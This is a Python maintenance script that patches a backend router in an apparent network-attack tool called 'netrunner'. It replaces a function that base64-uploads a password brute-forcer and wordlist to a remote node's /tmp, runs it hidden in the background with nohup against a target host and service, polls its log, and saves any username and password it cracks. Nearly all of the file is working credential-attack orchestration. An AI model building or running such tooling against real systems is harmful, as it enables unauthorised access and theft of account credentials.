import re

def process_file():
    with open('/home/aso/Dokumenter/github/netrunner/backend/routers/bruteforce.py', 'r') as f:
        content = f.read()

    new_func = """async def _run_attack_bg(nid: str, node: dict, service: str, payload: dict):
    # Upload the script and wordlist, then run it via the session manager
    script_content = (SCRIPTS_DIR / "bruteforcer.py").read_text()
    encoded_script = base64.b64encode(script_content.encode()).decode()
    remote_script = "/tmp/netrunner-bruteforcer.py"
    target_ip = node["host"]
    
    cmd_upload = f"echo {encoded_script} | base64 -d > {remote_script} && chmod +x {remote_script}"
    
    attack_mode = payload.get("attack_mode", "wordlist")
    
    try:
        session = session_manager.get_session(nid)
        if not session:
            success, _ = await session_manager.open(nid, node, auto=True)
            if not success:
                active_attacks[nid] = {"status": "failed", "message": "Could not connect to node"}
                return
            session = session_manager.get_session(nid)

        if not hasattr(session, 'run_command'):
            active_attacks[nid] = {"status": "failed", "message": "Session does not support running commands"}
            return

        session.run_command(cmd_upload)

        if attack_mode == "wordlist":
            wordlist_name = payload.get("wordlist")
            wordlist_path = WORDLISTS_DIR / wordlist_name
            if not wordlist_path.exists():
                active_attacks[nid] = {"status": "failed", "message": f"Wordlist {wordlist_name} not found"}
                return
                
            wordlist_content = wordlist_path.read_text(errors='ignore')
            encoded_wordlist = base64.b64encode(wordlist_content.encode()).decode()
            remote_wordlist = f"/tmp/{wordlist_name}"
            cmd_upload_wl = f"echo {encoded_wordlist} | base64 -d > {remote_wordlist}"
            session.run_command(cmd_upload_wl)
            cmd_run = f"python3 {remote_script} --target {target_ip} --service {service} --wordlist {remote_wordlist}"
        else:
            algo_user = payload.get("algo_user", "root")
            algo_charset = payload.get("algo_charset", "aA1")
            algo_min = payload.get("algo_min", 1)
            algo_max = payload.get("algo_max", 4)
            cmd_run = f"python3 {remote_script} --target {target_ip} --service {service} --algo --algo-user {algo_user} --algo-charset '{algo_charset}' --algo-min {algo_min} --algo-max {algo_max}"
            
        # Launch in background
        log_file = f"/tmp/bruteforce_{nid}.log"
        session.run_command(f"rm -f {log_file}")
        cmd_bg = f"nohup {cmd_run} > {log_file} 2>&1 & echo $!"
        pid = session.run_command(cmd_bg).strip()
        
        # Poll log
        active_attacks[nid]["progress"] = 0
        active_attacks[nid]["total"] = 0
        active_attacks[nid]["pid"] = pid
        
        found_creds = None
        last_msg = ""
        
        import asyncio
        while active_attacks.get(nid, {}).get("status") == "running":
            await asyncio.sleep(2)
            log_out = session.run_command(f"tail -n 20 {log_file} 2>/dev/null")
            
            # Check for progress
            prog_matches = re.findall(r"\[PROGRESS\] (\d+)/(\d+)", log_out)
            if prog_matches:
                active_attacks[nid]["progress"] = int(prog_matches[-1][0])
                active_attacks[nid]["total"] = int(prog_matches[-1][1])
            
            # Check for success or error
            for line in log_out.split('\\n'):
                if "[DATA]" in line:
                    try:
                        json_str = line.split("[DATA]", 1)[1].strip()
                        data = json.loads(json_str)
                        if data.get("success"):
                            found_creds = {"username": data.get("username"), "password": data.get("password")}
                            break
                        elif data.get("error"):
                            last_msg = data.get("error")
                    except: pass
            
            if found_creds or "exhausted" in log_out or "failed" in log_out:
                break
                
            # Check if process is still alive
            is_alive = session.run_command(f"ps -p {pid} >/dev/null 2>&1 && echo YES || echo NO")
            if "NO" in is_alive:
                break
    
        if active_attacks.get(nid, {}).get("status") == "cancelled":
            return
            
        if found_creds:
            await store_credentials(nid, found_creds["username"], found_creds["password"])
            active_attacks[nid] = {
                "status": "success",
                "message": f"Found valid credentials! User: {found_creds['username']}",
                "credentials": found_creds
            }
        else:
            active_attacks[nid] = {
                "status": "failed",
                "message": last_msg or "Dictionary exhausted without success."
            }
            
    except Exception as e:
        active_attacks[nid] = {"status": "failed", "message": f"Internal error: {e}"}"""

    # We need to find `async def _run_attack_bg(...)` to the end of it
    m = re.search(r'(async def _run_attack_bg\(.*?\):.*?)@router\.post\("/bruteforce/attack"\)', content, re.DOTALL)
    if m:
        old_func = m.group(1)
        content = content.replace(old_func, new_func + "\n\n")

    with open('/home/aso/Dokumenter/github/netrunner/backend/routers/bruteforce.py', 'w') as f:
        f.write(content)

process_file()
